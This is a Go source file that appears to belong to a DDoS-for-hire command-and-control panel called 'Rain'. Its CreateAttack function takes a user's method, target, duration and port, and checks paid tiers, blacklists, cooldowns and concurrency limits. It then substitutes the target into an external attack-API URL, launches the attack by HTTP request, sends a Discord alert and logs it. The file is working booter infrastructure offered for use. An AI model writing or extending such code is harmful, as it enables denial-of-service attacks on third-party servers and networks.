package APIAttacks

import (
	"fmt"
	"log"
	"net/http"
	"net/url"
	"reflect"
	"strconv"
	"strings"
	"time"

	Execute "Rain/core/config/views/user"
	Database "Rain/core/database"
	ParsedJson "Rain/core/functions/json/meta"
	Discord "Rain/core/functions/webserver"
	Sessions "Rain/core/masters/sessions"
)

type MethodAttacks struct {
	Target   string
	Duration int
	Port     int
	Method   string
}

var _ = reflect.TypeOf(MethodAttacks{})

func CreateAttack(command []string, session *Sessions.Session) {
	// Convert the command to lower case
	for i := range command {
		command[i] = strings.ToLower(command[i])
	}

	Method := Get(command[0])

	if len(command) < 3 {
		Execute.Execute_CustomTerm("attack-syntax", session.User, session.Channel, true, nil)
		return
	} // Check if the user has entered the correct syntax

	VIPParser := strconv.FormatBool(Method.Management.VIPMethod)
	UserVIP := strconv.FormatBool(session.User.VIP)

	RawParser := strconv.FormatBool(Method.Management.RawMethod)
	UserRaw := strconv.FormatBool(session.User.Raw)

	HolderParser := strconv.FormatBool(Method.Management.HolderMethod)
	UserHolder := strconv.FormatBool(session.User.Holder)

	AdminParser := strconv.FormatBool(Method.Management.AdminMethod)
	UserAdmin := strconv.FormatBool(session.User.Admin)

	if Method.Management.VIPMethod {
		if !strings.EqualFold(VIPParser, UserVIP) {
			Execute.Execute_CustomTerm("method-vip", session.User, session.Channel, true, nil)
			return
		}
	} // Check if the method is VIP and User has VIP

	if Method.Management.RawMethod {
		if !strings.EqualFold(RawParser, UserRaw) {
			Execute.Execute_CustomTerm("method-raw", session.User, session.Channel, true, nil)
			return
		}
	} // Check if the method is Raw and User has Raw

	if Method.Management.HolderMethod {
		if !strings.EqualFold(HolderParser, UserHolder) {
			Execute.Execute_CustomTerm("method-holder", session.User, session.Channel, true, nil)
			return
		}
	} // Check if the method is Holder and User has Holder

	if Method.Management.AdminMethod {
		if !strings.EqualFold(AdminParser, UserAdmin) {
			Execute.Execute_CustomTerm("method-admin", session.User, session.Channel, true, nil)
			return
		}
	} // Check if the method is Admin and User has Admin

	if !session.User.Bypassblacklist {
		if CheckBlacklist(command[1]) {
			Execute.Execute_CustomTerm("target-blacklisted", session.User, session.Channel, true, nil)
			return
		}
	} // Check if the target is blacklisted and if the User can bypass blacklist

	RunTime, error := strconv.Atoi(command[2])

	if error != nil {
		Execute.Execute_CustomTerm("duration-invalid", session.User, session.Channel, true, nil)
		return
	} // Check if the duration is an int

	if RunTime > Method.Management.MaxDuration {
		Execute.Execute_CustomTerm("max-time", session.User, session.Channel, true, nil)
		return
	} // Check if the duration is greater than the max time

	if RunTime > session.User.MaxTime {
		Execute.Execute_CustomTerm("user-duration", session.User, session.Channel, true, nil)
		return
	} // Check if the duration is greater than the max time for the user

	var Port int

	if len(command) == 3 {
		Port = Method.Management.DefaultPort // If they don't give a port it uses the default one
	} else {
		PortInt, error := strconv.Atoi(command[3])
		if error != nil {
			Execute.Execute_CustomTerm("port-invalid", session.User, session.Channel, true, nil)
			return
		} // The port they gave isn't valid e.g. isn't an int
		Port = PortInt
	}

	RunningAttacks, error := Database.GetRunningUser(session.User.Username)
	if error != nil {
		Execute.Execute_CustomTerm("database-error", session.User, session.Channel, true, nil)
		return
	} // Databae can't get the running attacks for the user

	MyRunningAttacks, error := Database.MyAttacking(session.User.Username)
	if error != nil {
		Execute.Execute_CustomTerm("database-error", session.User, session.Channel, true, nil)
		return
	} // Database can't get the running attacks for the user

	APIAttacks, error := Database.GetAPI_Running(Method.Name)
	if error != nil {
		Execute.Execute_CustomTerm("database-error", session.User, session.Channel, true, nil)
		return
	} // Database can't get the running attacks for the user

	if APIAttacks >= Method.Management.MaxConcurrents {
		Execute.Execute_CustomTerm("max-concurrents", session.User, session.Channel, true, nil)
		return
	}

	if len(MyRunningAttacks) != 0 {

		if session.User.Concurrents <= RunningAttacks {
			Execute.Execute_CustomTerm("user-concurrents", session.User, session.Channel, true, nil)
			return
		} // User has reached the max concurrents

		var Recent *Database.Attack = MyRunningAttacks[0]

		for _, attack := range MyRunningAttacks {
			if attack.Created > Recent.Created {
				Recent = attack
				continue
			}
		}

		if Recent.Created+int64(session.User.Cooldown) > time.Now().Unix() && session.User.Cooldown != 0 {
			TimeToWait := time.Unix(Recent.Created+int64(session.User.Cooldown), 64)
			var New = map[string]string{
				"wait": fmt.Sprintf("%.0f", time.Until(TimeToWait).Seconds()),
			}

			Execute.Execute_CustomTerm("user-cooldown", session.User, session.Channel, true, New)
			return
		} // User has made too many attacks within the cooldown
	}

	if session.User.Powersaving {
		UnderAttack, error := Database.AlreadyUnderAttack(session.User.Username, command[1])
		if error != nil {
			Execute.Execute_CustomTerm("database-error", session.User, session.Channel, true, nil)
			return
		} // Database can't get user

		if UnderAttack != nil {
			EndTime, _ := strconv.ParseInt(strconv.Itoa(int(UnderAttack.End)), 10, 64)
			TimeToWait := time.Unix(EndTime, 0)

			var New = map[string]string{
				"target":   UnderAttack.Target,
				"method":   UnderAttack.Method,
				"duration": strconv.Itoa(UnderAttack.Duration),
				"wait":     fmt.Sprintf("%.0f", time.Until(TimeToWait).Seconds()),
				"reason":   "Powersaving is enabled for your account",
			}

			Execute.Execute_CustomTerm("user-powersaving", session.User, session.Channel, true, New)
			return // If theres an attack on the target and the user has powersaving enabled it will return
		}
	}

	var NewStructure = MethodAttacks{
		Target:   command[1],
		Port:     Port,
		Duration: RunTime,
		Method:   command[0],
	}

	if len(command) == 3 {
		Execute.Execute_CustomTerm("default-port", session.User, session.Channel, true, nil)
		return
	} // If no port is given display the branding file for default port used - attack sent

	if len(command) == 2 {
		Execute.Execute_CustomTerm("default-duration", session.User, session.Channel, true, nil)
	} // If no duration is given display the branding file for default duration used - attack sent

	if err := Discord.DiscordAttackAlert(session.User.Username, NewStructure.Target, strconv.Itoa(NewStructure.Port), strconv.Itoa(NewStructure.Duration), NewStructure.Method); err != nil {
		fmt.Println("\x1b[48;5;9m\x1b[38;5;16m ERROR \x1b[0m: " + err.Error())
	} // Send discord webhook, if can't print error in terminal

	if len(Method.Links[0].Target) == 0 {
		return
	} // If no API URL is given return

	var URL string = Method.Links[0].Target

	if Method.Links[0].URLEncode {
		URL = strings.Replace(URL, "[target]", url.QueryEscape(NewStructure.Target), -1)
		URL = strings.Replace(URL, "[port]", url.QueryEscape(strconv.Itoa(NewStructure.Port)), -1)
		URL = strings.Replace(URL, "[duration]", url.QueryEscape(strconv.Itoa(NewStructure.Duration)), -1)
		URL = strings.Replace(URL, "[method]", url.QueryEscape(Method.Links[0].Method), -1)
	} else {
		URL = strings.Replace(URL, "[target]", NewStructure.Target, -1)
		URL = strings.Replace(URL, "[port]", strconv.Itoa(NewStructure.Port), -1)
		URL = strings.Replace(URL, "[duration]", strconv.Itoa(NewStructure.Duration), -1)
		URL = strings.Replace(URL, "[method]", Method.Links[0].Method, -1)
	}

	error = Launch_debug(URL, Method, 0)
	if error != nil && session.User.Admin {
		custommap := map[string]string{
			"target": NewStructure.Target,
			"reason": error.Error(),
		}

		Execute.Execute_CustomTerm("attack-failed", session.User, session.Channel, true, custommap)
		return // If the attack failed and the user is admin give the exact error on the CNC
	} else if error != nil {
		dcustommap := map[string]string{
			"target": NewStructure.Target,
			"reason": "failed to launch attack successfully",
		}

		Execute.Execute_CustomTerm("attack-failed", session.User, session.Channel, true, dcustommap)
		return // If attack failed and the user isn't admin give a generic error
	}

	custommap := map[string]string{
		"target":   NewStructure.Target,
		"port":     strconv.Itoa(NewStructure.Port),
		"duration": strconv.Itoa(NewStructure.Duration),
		"method":   NewStructure.Method,
	}

	error = Database.LogAttack(&Database.Attack{
		API:      Method.API,
		Method:   Method.Name,
		Username: session.User.Username,
		Target:   NewStructure.Target,
		Port:     NewStructure.Port,
		Duration: NewStructure.Duration,
		End:      time.Now().Add(time.Duration(NewStructure.Duration) * time.Second).Unix(),
		Created:  time.Now().Unix(),
	}) // Log the error to the database

	if error != nil {
		session.Channel.Write([]byte("Failed to log attack to database\r\n"))
		log.Println("ERROR: `Attack Logging` `" + session.User.Username + "` " + error.Error())
		return
	}

	Execute.Execute_CustomTerm("attack-success", session.User, session.Channel, true, custommap) // If the attack was successful display the branding file
}

func Launch_debug(Link string, Method *ParsedJson.AttackMethod, APINum int) error {
	cli := http.Client{
		Timeout: time.Second * time.Duration(Method.Management.Timeout),
	}
	Resp, error := cli.Get(Link)
	if Method.Links[0].Debugging {
		if error != nil {
			log.Println("==== FAILED TO SEND ON API #" + strconv.Itoa(APINum+1) + " ====")
			log.Println("Error: " + error.Error())
			log.Println("Link:" + Link)
			return error
		} else if Resp.StatusCode != 200 {
			log.Println("==== FAILED TO SEND ON API #" + strconv.Itoa(APINum+1) + " ====")
			log.Println("Link: " + Link)
			log.Println("URL: " + Link)
			log.Println("HTTP Code: " + strconv.Itoa(Resp.StatusCode))
			log.Println("Method: " + Method.Name)
			return error
		} else {
			log.Println("==== ATTACK SENT THROUGH API #" + strconv.Itoa(APINum+1) + "====")
			log.Println("HTTP Code: " + strconv.Itoa(Resp.StatusCode))
			log.Println("Method: " + Method.Name)
			return nil
		}
	}
	return error
}
